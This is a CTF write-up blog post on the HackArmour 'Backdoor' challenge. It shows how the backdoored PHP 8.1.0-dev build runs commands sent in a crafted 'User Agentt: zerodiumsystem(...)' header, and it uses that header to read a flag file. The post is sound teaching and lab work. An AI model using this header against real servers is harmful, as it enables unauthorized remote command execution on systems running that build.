---
title: "HackArmour CTF Writeups: Backdoor"
categories: "hackarmour-ctf"
tags: "exploit"
date: 2021-06-28 11:00:00
description: This post is a writeup of the `Backdoor` challenge of the HackArmour June '21 CTF.
---

[![The Challenge](https://cdn.jsdelivr.net/gh/mrnightdev/blog-images@master/2021/06/backdoor/00-challenge.png)](https://ctf.hackarmour.tech/challenges#Backdoor-10)

{{ page.description}}

Link : [104.248.153.17:2500][challenge-link]

## Visiting the website

![the website](https://cdn.jsdelivr.net/gh/mrnightdev/blog-images@master/2021/06/backdoor/01-website.png)

We can see that the website uses php version `8.1.0-dev`.

## A little backstory

This version was released with a backdoor in March 2021 when two malicious commits were pushed to to the php source repo. You can read the announcement [here](https://news-web.php.net/php.internals/113838).

## About the Vulnerability

If we add a header to the request `User Agentt: zerodiumsystem('ls')`,
the server executes the command `ls`.

## Exploit

Start Burp Suite and capture the request.

![Captured Request](https://cdn.jsdelivr.net/gh/mrnightdev/blog-images@master/2021/06/backdoor/02-burp_req.png)

~~Yes I am on Windows :/~~

We are told the flag is in `/opt/flag.txt`. So let us add the header

```cmd
User Agentt: zerodiumsystem('cat /opt/flag.txt');
```

and forward the request.

![Modified Request](https://cdn.jsdelivr.net/gh/mrnightdev/blog-images@master/2021/06/backdoor/03-modified-req.png)

And voilà! We see the flag in the response.

![Exploit Successful](https://cdn.jsdelivr.net/gh/mrnightdev/blog-images@master/2021/06/backdoor/04-success.png)

PHP should really check their PRs, don't they? ;)

## External Links

[Exploit DB exploit](https://www.exploit-db.com/exploits/49933)

[PHP's announcement on this exploit](https://news-web.php.net/php.internals/113838)

[challenge-link]: http://104.248.153.17:2500/
